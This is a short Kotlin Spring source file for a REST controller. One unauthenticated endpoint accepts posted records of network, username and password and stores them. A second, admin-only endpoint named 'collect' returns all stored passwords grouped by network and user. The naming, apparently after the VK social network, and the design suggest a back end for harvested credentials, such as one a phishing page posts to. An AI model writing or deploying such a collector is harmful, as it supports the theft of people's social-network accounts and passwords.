package app.controllers

import app.models.VKEntity
import app.repositories.PasswordRepository
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.http.HttpStatus.CREATED
import org.springframework.http.MediaType
import org.springframework.security.access.annotation.Secured
import org.springframework.transaction.annotation.Transactional
import org.springframework.web.bind.annotation.*
import org.springframework.web.bind.annotation.RestController

@RestController
open class PasswordsRestController {
	@Autowired
	private lateinit var repository : PasswordRepository

	@Transactional
	@PostMapping("/passwords/{email}" , consumes = [MediaType.APPLICATION_JSON_UTF8_VALUE])
	@ResponseStatus(code = CREATED)
	open fun savePassword(@RequestBody user : VKEntity , @PathVariable email : String) {
		repository.save(user)
	}

	@Transactional(readOnly = true)
	@GetMapping("/passwords")
	@Secured("ROLE_ADMIN")
	open fun collect() = repository
			.findAll()
			.groupBy(VKEntity::network)
			.mapValues {
				it.value.groupBy(VKEntity::username , VKEntity::password)
						.mapValues { list -> list.value.distinct() }
			}

}